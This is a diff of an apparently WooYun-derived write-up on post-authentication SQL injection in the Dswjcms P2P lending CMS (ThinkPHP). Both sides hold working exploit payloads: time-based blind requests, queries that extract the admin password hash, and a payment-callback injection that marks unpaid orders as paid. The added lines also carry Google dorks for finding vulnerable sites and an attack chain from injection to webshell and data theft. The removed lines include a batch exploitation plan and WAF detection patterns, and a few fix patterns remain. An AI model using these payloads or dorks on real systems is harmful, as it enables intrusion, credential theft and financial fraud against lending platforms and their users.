-    // Direct concatenation, bid parameter not filtered
-}
+$borrow = $borrowing->field('money')->where('`id`='.$this->_get('bid'))->find();
 ```
 
-**Exploitation Payload**:
 ```http
 GET /Center/loan/?mid=plan&bid=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23 HTTP/1.1
-Host: target.com
-Cookie: PHPSESSID=logged_in_session_id
 ```
 
 ```sql
--- Time-based blind injection chain
--- 1. Basic delay test
-bid=1) AND SLEEP(6)-- -
-
--- 2. Conditional delay (guessing database name)
 bid=1) AND IF((SELECT database())='dswjcms',SLEEP(6),0)-- -
-
--- 3. Character-by-character guessing (binary search optimization)
-bid=1) AND IF(ASCII((SELECT SUBSTRING(database(),1,1)))>100,SLEEP(2),0)-- -
-
--- 4. Extract admin password hash
 bid=1) AND IF(ASCII((SELECT SUBSTRING(password,1,1) FROM ds_admin LIMIT 1))>48,SLEEP(2),0)-- -
 ```
 
-**Vulnerability Point 3: emailVerify function (POST injection)**
+**Point 3: emailVerify function -- POST string injection**
 
 ```php
-// Vulnerable code
-public function emailVerify(){
-    $userinfo = M('user');
-    $getfield = $userinfo->where("`id`=".$this->_session('user_uid')." and `email`='".$this->_post('email')."'")->find();
-    // email parameter directly concatenated into string-type query
-}
+$getfield = $userinfo->where("`id`=".$this->_session('user_uid')." and `email`='".$this->_post('email')."'")->find();
 ```
 
-**Exploitation Payload**:
 ```http
 POST /Center/emailVerify/ HTTP/1.1
-Host: target.com
-Cookie: PHPSESSID=logged_in_session_id
 Content-Type: application/x-www-form-urlencoded
 
 email=test') AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23
 ```
 
 ```sql
--- String-type injection chain
--- 1. Close single quote
-email=admin'--
-
--- 2. Time-based blind injection
-email=admin' AND SLEEP(6)-- -
-
--- 3. Boolean-based blind injection (verify email)
 email=admin' AND (SELECT COUNT(*) FROM ds_user WHERE username='admin')>0-- -
-
--- 4. Error-based injection (MySQL 5.x)
 email=admin' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
 ```
 
-**Vulnerability Point 4: alipayreturn function (third-party payment callback injection)**
+**Point 4: alipayreturn function -- payment callback injection**
 
 ```php
-// Vulnerable code
-public function alipayreturn(){
-    $recharge = M('recharge');
-    $rechar = $recharge->where('nid='.$this->_get('out_trade_no'))->find();
-    // out_trade_no parameter directly concatenated, used for payment callback verification
-
-    $recharge->where('nid='.$this->_get('out_trade_no'))->save(array('type'=>2,'audittime'=>time()));
-    // Two injection points in both SELECT and UPDATE
-}
-```
-
-**Exploitation Payload**:
-```http
-GET /Center/alipayreturn/?out_trade_no=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'-- HTTP/1.1
-Host: target.com
-Cookie: PHPSESSID=logged_in_session_id
+$rechar = $recharge->where('nid='.$this->_get('out_trade_no'))->find();
+$recharge->where('nid='.$this->_get('out_trade_no'))->save(array('type'=>2,'audittime'=>time()));
+// Two injection points in both SELECT and UPDATE
 ```
 
 ```sql
--- Special exploitation of payment callback injection
--- 1. Change recharge status to success (bypass payment)
+-- Change recharge status to success (bypass payment)
 out_trade_no=test' OR 1=1-- -
--- May result in: all unpaid orders changed to paid
-
--- 2. Tamper with recharge amount (requires UPDATE injection)
-out_trade_no=test'-- -
--- Constructing with UPDATE statement requires special techniques
-
--- 3. Blind injection to obtain user data
+-- Blind injection to obtain user data
 out_trade_no=test') AND SLEEP(6)-- -
 ```
 
-### Bypass Techniques
-
-| Bypass Type | Specific Technique | Applicable Scenario |
-|------------|-------------------|-------------------|
-| **Pseudo-static URL** | Remove .html suffix and test directly | ThinkPHP pseudo-static mode |
-| **Framework filtering** | Use numeric injection to bypass GPC | ThinkPHP's I() method filters strings but not numbers |
-| **Session validation** | Register regular account to obtain Cookie | Injection points requiring login authentication |
-| **Business logic restrictions** | Construct valid business data before testing | Requires specific business data to exist (e.g., investment records) |
-| **Parameter name obfuscation** | Test all ID-type parameters | bid, uid, mid, id, nper, etc. |
-
-**ThinkPHP framework-specific bypass techniques**:
+### ThinkPHP M() Method Bypass Patterns
 
 ```php
-// Framework-provided filtering methods (with bypasses)
 $this->_get('param')    // I('get.param') defaults to htmlspecialchars
 $this->_post('param')   // But numeric injection is unaffected
-$this->_param('param')  // Auto-detects GET/POST
 
-// Bypass methods:
-// 1. Use numeric injection (quotes not involved in concatenation)
-$where('id='.$_GET['id'])  // Direct concatenation
-
-// 2. Use M() method instead of D() method
 M('table')  // Returns base Model, no data validation
 D('table')  // Returns specific Model, may have field validation
 
-// 3. Using array-style where clause
-$where['id'] = $_GET['id'];  // Array style will be filtered
-$where['id'] = array('eq', $_GET['id']);  // May bypass
+// Array-style where clause bypass
+$where['id'] = array('eq', $_GET['id']);  // May bypass filtering
 ```
 
-**Pseudo-static URL handling techniques**:
+**Pseudo-static URL conversion** (ThinkPHP): `/Module/Controller/Method/param1/value1.html` -> `?param1=value1`
 
-```bash
-# Original URL (pseudo-static)
-https://example.com/[redacted]
+### Batch Exploitation Methodology
 
-# Convert to GET parameter format
-https://example.com/[redacted]
-
-# Why conversion is needed:
-# 1. Route parsing issues: Some frameworks handle PATH_INFO mode improperly
-# 2. Injection testing convenience: Easier to modify parameters
-# 3. WAF bypass: URL patterns may not be covered by rules
-
-# Conversion rules (ThinkPHP)
-# /Module/Controller/Method/param1/value1/param2/value2.html
-# -> ?param1=value1&param2=value2
-```
-
-### Root Cause Analysis
-
-**Systematic Thinking**:
-
-1. **False sense of security in post-authentication**
-   - Developer misconception: "Users who can log in are all trustworthy"
-   - Attacker perspective: Registering an account bypasses "unauthorized access" detection
-   - Defense blind spot: Code audit tools only scan unauthenticated paths, ignoring post-authentication business logic
-
-2. **Underestimated risk of numeric injection**
-   - Developer assumption: "IDs are numbers, they cannot be injected"
-   - Attacker reality: Numeric injection is harder to detect (no quote closure issues)
-   - Statistical data: From WooYun cases, numeric injection accounts for approximately 40% (id, bid, uid, etc.)
-
-3. **Responsibility attribution of framework security**
-   - Framework provides: ThinkPHP provides I() method for automatic filtering
-   - Developer misuse: Directly using `$_GET` or concatenating SQL
-   - Framework limitation: M() method has no automatic validation; D() method requires proper Model definition
-
-4. **High-value target of P2P lending business**
-   - Sensitive data: User identity documents, bank cards, transaction records
-   - Financial risk: Possible modification of recharge status, loan amounts
-   - Compliance requirements: Financial industry security standards are higher, but actual implementation often falls short
-
-### Defense Recommendations
-
-**Developer level**:
-1. **Uniformly use parameterized queries** (most effective)
-   ```php
-   // Wrong approach
-   $refund->where('bid='.$this->_get('bid'))->select();
-
-   // Correct approach (ThinkPHP 3.x)
-   $refund->where(array('bid' => I('get.bid', 0, 'intval')))->select();
-
-   // Best practice (using prepared statements)
-   $Model = new Model();
-   $result = $Model->query("SELECT * FROM table WHERE bid = ?", array($bid));
-   ```
-
-2. **Force type casting for numeric parameters**
-   ```php
-   // Force all ID-type parameters to integer
-   $bid = intval($this->_get('bid'));
-   $uid = intval($this->_session('user_uid'));
-   ```
-
-3. **Allowlist validation for business parameters**
-   ```php
-   // Verify bid belongs to current user
-   $borrow = $borrowing->where('id='.$bid.' and uid='.$this->_session('user_uid'))->find();
-   if(!$borrow){
-       $this->error('Unauthorized access to this data');
-   }
-   ```
-
-4. **Remove error information exposure**
-   ```php
-   // Disable debug mode in production
-   'SHOW_PAGE_TRACE' => false,
-   'ERROR_PAGE' => '/Public/error.html',
-   ```
-
-**Architecture level**:
-1. **Deploy WAF rules**
-   ```
-   # Detect post-authentication SQL injection characteristics
-   - Cookie present + parameter contains UNION SELECT
-   - Cookie present + parameter contains SLEEP(
-   - Cookie present + parameter contains benchmark(
-   ```
-
-2. **Database privilege isolation**
-   ```sql
-   -- Application account should only be granted necessary privileges
-   GRANT SELECT, INSERT, UPDATE ON dswjcms.* TO 'app_user'@'localhost';
-   -- Do not grant FILE, SUPER, or other high-risk privileges
-   ```
-
-3. **Code audit process**
-   - Focus on checking all post-authentication controllers
-   - Search for `where(` keyword to locate SQL concatenation points
-   - Examine all user-controllable parameters (GET/POST/COOKIE)
-
-### CMS Vulnerability Discovery General Methodology
-
-**Methodology Framework**:
-
-```
-Phase 1: CMS Identification
-  |-- Fingerprinting: Page footer copyright, directory structure, specific files
-  |-- Version identification: CHANGELOG.md, readme.txt, JS/CSS version numbers
-  +-- Framework identification: ThinkPHP / Laravel / CodeIgniter, etc.
-
-Phase 2: Vulnerability Intelligence Gathering
-  |-- Official documentation: Review known security issues, version changelogs
-  |-- Public vulnerabilities: WooYun, CVE, CNVD, EXP-DB
-  |-- Community discussions: GitHub Issues, Stack Overflow, technical forums
-  +-- Historical versions: Download old version source code for code audit
-
-Phase 3: Rapid Vulnerability Targeting
-  |-- Known vulnerability reproduction: Directly test public vulnerability POCs
-  |-- Similar version comparison: Compare code differences between old and new versions
-  |-- Framework vulnerability patterns: Known issues in ThinkPHP 3.x, Laravel 5.x
-  +-- Business logic vulnerabilities: Payment, authorization, file upload, and other core functions
-
-Phase 4: Deep Discovery
-  |-- Unauthenticated endpoints: Registration, login, password recovery
-  |-- Low-privilege endpoints: Regular members, VIP members
-  |-- Business logic traversal: Bidding, loans, recharge, withdrawal
-  +-- Second-order exploitation: Injection -> File upload -> WebShell
-
-Phase 5: Automation and Batch Operations
-  |-- Write POC scripts: Python/Go
-  |-- Integrate into scanners: AWVS, Nessus, custom tools
-  |-- Search engine batch: Google Hacking, Shodan, Fofa
-  +-- Vulnerability report output: Compile evidence chain, write detailed POC
-```
-
-**High-value CMS vulnerability patterns**:
-
-| Vulnerability Type | Keyword Search | Typical Exploitation Chain |
-|-------------------|--------------|--------------------------|
-| **Post-auth injection** | `where(` + `$this->_get` | Register account -> Login -> Inject |
-| **Pseudo-static bypass** | `.html` + `$this->_param` | Remove suffix -> Parameter injection |
-| **Payment logic** | `recharge` + `alipay` | Modify amount -> Recharge success |
-| **File upload** | `upload()` + `avatar` | Upload image -> Include WebShell |
-| **Privilege escalation** | `role` + `level` | Modify Cookie -> Admin privileges |
-
-**Practical techniques checklist**:
-
-```markdown
-[ ] 1. Register a regular member account (test low privilege first)
-[ ] 2. Capture post-login Cookie (save to Burp Suite)
-[ ] 3. Traverse all business function URLs (invest, loan, recharge, etc.)
-[ ] 4. Extract all ID-type parameters (bid, uid, id, mid, nper)
-[ ] 5. Test numeric injection (no single quote closure needed)
-   +-- Payload: id=1 AND 1=1 / id=1 AND 1=2
-[ ] 6. Test string-type injection (requires closing quotes)
-   +-- Payload: name=admin' AND '1'='1
-[ ] 7. Test pseudo-static URLs (remove .html suffix)
-   +-- /Center/invest/mid/plan/bid/1.html
-   +-- -> /Center/invest/?mid=plan&bid=1
-[ ] 8. Test time-based blind injection (less likely to be detected by WAF)
-   +-- Payload: id=1) AND SLEEP(6)--
-[ ] 9. Test union queries (fastest data extraction)
-   +-- Payload: id=-1 UNION SELECT 1,2,3,4,5,6,7,8
-[ ] 10. Leverage framework features (ThinkPHP's M() method)
-   +-- Direct SQL concatenation, no automatic validation
-```
+**Google Hacking dorks**:
+- `intext:"Powered by Dswjcms"`
+- `intitle:"Dswjcms P2P lending system"`
+- `inurl:/Center/invest`
 
 **Extended attack surface**:
-
 ```
-SQL injection -> Get admin password -> Backend login -> File upload function -> WebShell
+SQL injection -> ds_admin credentials -> Backend login -> File upload -> WebShell
            |
-       Read sensitive config files -> Database connection info -> Direct DB connect -> Export all user data
+       Read config files -> DB connection info -> Export all user data
            |
        Payment callback injection -> Tamper recharge amount -> Financial loss
            |
        Batch lending sites -> Entire industry data breach
 ```
 
-**Batch exploitation key strategies**:
+### ThinkPHP 3.x Fix Patterns
 
-1. **Identification phase**: Use Google Hacking syntax to quickly locate targets
-   - `intext:"Powered by Dswjcms"`
-   - `intitle:"Dswjcms P2P lending system"`
-   - `inurl:/Center/invest`
+```php
+// Wrong: direct concatenation with M()
+$refund->where('bid='.$this->_get('bid'))->select();
 
-2. **Validation phase**: Automated scripts for batch vulnerability verification
-   - Concurrent testing (multi-threaded/coroutines)
-   - Intelligent retry mechanism
-   - Result deduplication
+// Correct: array-style where with intval
+$refund->where(array('bid' => I('get.bid', 0, 'intval')))->select();
 
-3. **Exploitation phase**: Deep exploitation for high-value targets
-   - Extract sensitive data
-   - Obtain system privileges
-   - Lateral movement
+// Best: prepared statements
+$Model->query("SELECT * FROM table WHERE bid = ?", array($bid));
+```
 
 ---
 
